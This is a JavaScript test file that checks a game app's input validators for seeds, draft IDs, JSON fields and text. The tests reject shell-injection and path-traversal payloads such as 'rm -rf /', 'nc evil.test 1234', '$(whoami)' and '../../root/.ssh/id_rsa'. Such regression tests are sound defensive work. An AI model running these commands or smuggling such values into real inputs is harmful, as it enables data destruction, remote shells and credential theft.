import { describe, it, expect } from "vitest";

import validation from "../src/validation.js";

const { isValidSeed, isValidDraftId, assertSeed, assertDraftId, parseJsonField, assertInteger, assertArray, sanitizeText, parseBoolean, normalizeModifiers } = validation;

/**
 * These tests exist to keep the injection and traversal fixes from regressing.
 * Every rejected string below was, at some point, a value that would have
 * reached a shell command or a filesystem path unchecked.
 */

describe("seed validation", () => {
	it("accepts ordinary alphanumeric seeds", () => {
		expect(isValidSeed("abcde1234567890")).toBe(true);
		expect(isValidSeed("A1")).toBe(true);
		expect(isValidSeed("a".repeat(32))).toBe(true);
	});

	it("rejects shell metacharacters", () => {
		const payloads = [
			"abc; rm -rf /",
			"abc && curl evil.test",
			"abc | nc evil.test 1234",
			"abc`whoami`",
			"abc$(whoami)",
			"abc\nwhoami",
			"abc > /etc/passwd",
			"abc'; touch /tmp/pwned; '",
			'abc" ; touch /tmp/pwned',
			"abc&background",
		];
		for (const payload of payloads) {
			expect(isValidSeed(payload), payload).toBe(false);
			expect(() => assertSeed(payload)).toThrow(/Invalid seed/);
		}
	});

	it("rejects path traversal sequences", () => {
		const payloads = ["../etc", "..", "../../root/.ssh/id_rsa", "a/../../b", "/absolute", "a/b", "a%2f..%2fb"];
		for (const payload of payloads) {
			expect(isValidSeed(payload), payload).toBe(false);
		}
	});

	it("rejects empty, oversized and non-string values", () => {
		expect(isValidSeed("")).toBe(false);
		expect(isValidSeed("a".repeat(33))).toBe(false);
		expect(isValidSeed(null)).toBe(false);
		expect(isValidSeed(undefined)).toBe(false);
		expect(isValidSeed(12345)).toBe(false);
		expect(isValidSeed({})).toBe(false);
	});

	it("rejects NUL bytes, which truncate paths in native calls", () => {
		const NUL = String.fromCharCode(0);
		expect(isValidSeed(`abc${NUL}def`)).toBe(false);
		expect(isValidSeed(`abc${NUL}`)).toBe(false);
	});
});

describe("draft ID validation", () => {
	it("accepts digit strings", () => {
		expect(isValidDraftId("123456789012345")).toBe(true);
	});

	it("rejects anything non-numeric", () => {
		for (const payload of ["abc", "../123", "12; ls", "1.5", "-1", "", "1e5"]) {
			expect(isValidDraftId(payload), payload).toBe(false);
		}
		expect(() => assertDraftId("../123")).toThrow(/Invalid draftID/);
	});
});

describe("parseJsonField", () => {
	it("parses valid JSON", () => {
		expect(parseJsonField('{"a":1}', "body")).toEqual({ a: 1 });
	});

	it("throws a 400-bearing error rather than crashing on malformed JSON", () => {
		let error;
		try {
			parseJsonField("{not json", "modifiers");
		} catch (err) {
			error = err;
		}
		expect(error).toBeDefined();
		expect(error.status).toBe(400);
		expect(error.message).toMatch(/Malformed modifiers/);
	});

	it("rejects non-string input", () => {
		expect(() => parseJsonField(undefined, "presets")).toThrow(/Missing or malformed presets/);
	});
});

describe("assertInteger", () => {
	it("parses and range-checks", () => {
		expect(assertInteger("5", "n", { min: 1, max: 10 })).toBe(5);
		expect(assertInteger(5, "n", { min: 1, max: 10 })).toBe(5);
	});

	it("rejects out-of-range and non-numeric values", () => {
		expect(() => assertInteger("0", "n", { min: 1, max: 10 })).toThrow();
		expect(() => assertInteger("11", "n", { min: 1, max: 10 })).toThrow();
		expect(() => assertInteger("abc", "n")).toThrow();
		expect(() => assertInteger(1.5, "n")).toThrow();
	});
});

describe("assertArray", () => {
	it("enforces type and length", () => {
		expect(assertArray([1, 2], "x")).toEqual([1, 2]);
		expect(() => assertArray("nope", "x")).toThrow(/expected an array/);
		expect(() => assertArray([1, 2, 3], "x", { maxLength: 2 })).toThrow(/maximum length/);
	});
});

describe("sanitizeText", () => {
	it("strips control characters and terminal escapes", () => {
		const NUL = String.fromCharCode(0);
		const ESC = String.fromCharCode(27);
		const DEL = String.fromCharCode(127);
		const BELL = String.fromCharCode(7);

		expect(sanitizeText(`ab${NUL}c`)).toBe("abc");
		expect(sanitizeText(`a${ESC}[31mred`)).toBe("a[31mred");
		expect(sanitizeText(`a${DEL}b${BELL}c`)).toBe("abc");
		expect(sanitizeText("line\nbreak")).toBe("linebreak");
		expect(sanitizeText("tab\there")).toBe("tabhere");
	});

	it("truncates to the maximum length", () => {
		expect(sanitizeText("a".repeat(500), { maxLength: 10 })).toHaveLength(10);
	});

	it("returns the fallback for non-strings", () => {
		expect(sanitizeText(null, { fallback: "x" })).toBe("x");
		expect(sanitizeText(undefined)).toBe("");
	});

	it("leaves ordinary text untouched", () => {
		expect(sanitizeText("Bloody Fangs")).toBe("Bloody Fangs");
	});
});

describe("parseBoolean", () => {
	it("handles form-encoded booleans", () => {
		expect(parseBoolean("true")).toBe(true);
		expect(parseBoolean("false")).toBe(false);
		expect(parseBoolean(true)).toBe(true);
		expect(parseBoolean("garbage", true)).toBe(true);
	});
});

describe("normalizeModifiers", () => {
	it("clamps numeric modifiers into a safe range", () => {
		const result = normalizeModifiers({ hp: 1e9, speed: -50, building: "3" });
		expect(result.hp).toBe(100);
		expect(result.speed).toBe(0.01);
		expect(result.building).toBe(3);
	});

	it("supplies defaults for missing or hostile input", () => {
		expect(normalizeModifiers(null)).toEqual({
			randomCosts: false,
			hp: 1,
			speed: 1,
			blind: false,
			infinity: false,
			building: 1,
		});
		expect(normalizeModifiers({ hp: "NaN" }).hp).toBe(1);
	});

	it("drops unknown keys rather than passing them through", () => {
		const result = normalizeModifiers({ hp: 2, evil: "payload" });
		expect(result).not.toHaveProperty("evil");
	});
});
